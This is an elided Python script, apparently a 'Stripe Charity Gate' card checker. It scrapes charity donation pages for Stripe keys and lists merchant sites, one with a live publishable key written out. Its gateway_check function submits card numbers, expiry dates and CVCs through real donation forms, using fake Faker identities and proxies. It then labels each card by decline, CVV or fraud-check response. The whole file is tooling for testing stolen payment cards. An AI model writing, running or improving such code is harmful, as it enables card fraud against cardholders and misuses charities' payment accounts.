"""
Stripe Charity Gate - Full Authorization Flow
...
def _scrape_donation_page(session, url):
    ...
    try:
        ...
        return tokens if tokens.get('stripe_pk') else None
    except Exception:
        return None
...
MERCHANT_SITES = [
    ...
    },
    {
        ...
        'stripe_pk': 'pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp',
    },
    {
        'name': 'cedine',
...
def gateway_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None) -> Tuple[str, bool]:
    """
    Check card via Stripe using actual donation form submission.
    ...
    Returns (status_message, proxy_alive_boolean)
    """
    fake = Faker()
    ...
    use_proxy = proxy or PROXY
    if use_proxy:
        session.proxies.update(use_proxy)
    ...
    for site in MERCHANT_SITES:
        ...
        try:
            ...
            if r_token.status_code == 402:
                ...
                error_type = error_type_from_response(f"{code} {decline_code} {message}", r_token.status_code)
                ...
                if decline_code == 'insufficient_funds':
                    ...
                    return f"DECLINED ❌|{site_name}|Processing Error|{card_num[-4:]}", True
                elif error_type == GatewayErrorType.CVV_MISMATCH:
                    return f"CVV ❌|{site_name}|CVV Issue|{card_num[-4:]}", True
                elif error_type == GatewayErrorType.FRAUD_CHECK:
                    return f"DECLINED ❌|{site_name}|Fraud/Risk|{card_num[-4:]}", True
                else:
            ...
            if 'error' in resp:
                ...
                error_type = error_type_from_response(f"{code} {decline_code} {message}")
...
stripe_charity_check = gateway_check
